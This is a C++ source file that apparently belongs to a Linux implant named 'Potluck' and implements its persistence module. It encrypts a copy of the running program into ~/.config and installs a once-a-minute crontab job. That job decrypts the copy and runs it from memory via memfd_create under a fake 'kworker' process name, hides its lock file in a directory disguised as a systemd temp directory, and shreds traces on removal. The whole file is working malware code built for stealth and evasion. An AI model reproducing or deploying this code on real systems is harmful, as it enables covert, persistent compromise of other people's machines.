#include <iostream>
#include <string>

#include "persist.hpp"
#include "local.hpp"
#include "globals.hpp"

////PERSIST FUNCS
//check persist
bool Potpersist::checkPersist()
{
    //check temp
    //
    //check cron
    if (std::stoi(Potlocal::passCommand("crontab -l 2> /dev/null | grep '" + client_id+ "' | wc -l")) > 0)
    {
        return true;
    }
    else
    {
        return false;
    }
    //check .config
    //passCommand("if [ -d ~/.config/potluck/" + client_id + " ]; then echo 1; fi;");
}
//set persist
void Potpersist::setPersist(char* arg_string)//get rid of auto
{
    //remove references to "potluck"
    //"Do you have any idea how crazy you are?" "You mean the nature of this conversation?" "I mean the nature of you."
    if ( ! checkPersist() && (client_UID == 1000 || client_UID == 0))
    {
        //check python version
        //int python3_present = std::stoi(passCommand("if ! type -t python3 1> /dev/null; then echo 1; else echo 0; fi"));
        //generate password
        std::string persist_pass = Potlocal::passCommand("tr -dc A-Za-z0-9 </dev/urandom | head -c 24");
        //check persist path
        Potlocal::passCommand("if [ ! -d ~/.config/potluck ]; then mkdir -p ~/.config/potluck; fi;");
        //copy self to .config/.systext-settings/<uuid>
        Potlocal::passCommand("openssl enc -aes-256-ecb -a -pbkdf2 -k " + persist_pass +
        " -in " + (std::string)arg_string +
        " -out ~/.config/potluck/" + client_id);
        //add crontab
        Potlocal::passCommand("(crontab -l ; echo \"* * * * * tempdir=/tmp/\\$(ls /tmp "//change the * * * * * to something practical
        "| grep -o -m 1 '^systemd-private-[[:alnum:]]*')-systemd-systext.service-P0TlcK;"
        "if [ ! -d \\$tempdir ]; then mkdir \\$tempdir; fi; "
        "flock -w 0 \\$tempdir'/tmp' -c "
        "\\\"python3 -c \\\\\\\"import os, subprocess; fd=os.memfd_create('0'); "
        "os.write(fd, subprocess.Popen(['openssl', 'enc', '-aes-256-ecb', '-a', '-pbkdf2', '-in', '/home/" + user_name +
        "/.config/potluck/" + client_id +
        "', '-d', '-k', '" + persist_pass +
        "'], stdout=subprocess.PIPE).communicate()[0]); "
        "os.execve(f'/proc/{os.getpid()}/fd/{fd}', ['[POTLUCK/kworker/u:0]'], os.environ.copy())\\\\\\\"\\\"\")| crontab -");
    }
}
//remove persist
void Potpersist::removePersist()
{
    if (checkPersist())
    {
        //remove encrypted binary
        if (Potlocal::checkDisk("~/.config") == 1)
        {
            Potlocal::passCommand("shred -uz ~/.config/potluck/" + client_id + "; rm -r ~/.config/potluck");
        }
        else
        {
            Potlocal::passCommand("rm -r ~/.config/potluck");
        }
        //if nothing else in .config, delete
        Potlocal::passCommand("if [ $(ls -la ~/.config | wc -l) = 0 ]; then rm -d ~/.config");
        //remove cronjob
        Potlocal::passCommand("crontab -l | grep -v '" + client_id + "' | crontab -");
        //if persist was only cronjob, remove crontab
        Potlocal::passCommand("if [ $(crontab -l | grep -v -e '^#' -e '^[[:space:]]*$' | wc -l) = 0 ]; then crontab -r; fi");
        //remove lockfile
        if (Potlocal::checkDisk("/tmp") == 1)
        {
            Potlocal::passCommand("shred -uz /tmp/$(ls /tmp | grep systemd-systext.service-P0TlcK)/tmp" + client_id +
            "; rm -r /tmp/$(ls /tmp | grep systemd-systext.service-P0TlcK)");
        }
        else
        {
            Potlocal::passCommand("rm -r /tmp/$(ls /tmp | grep systemd-systext.service-P0TlcK)");
        }
    }
}
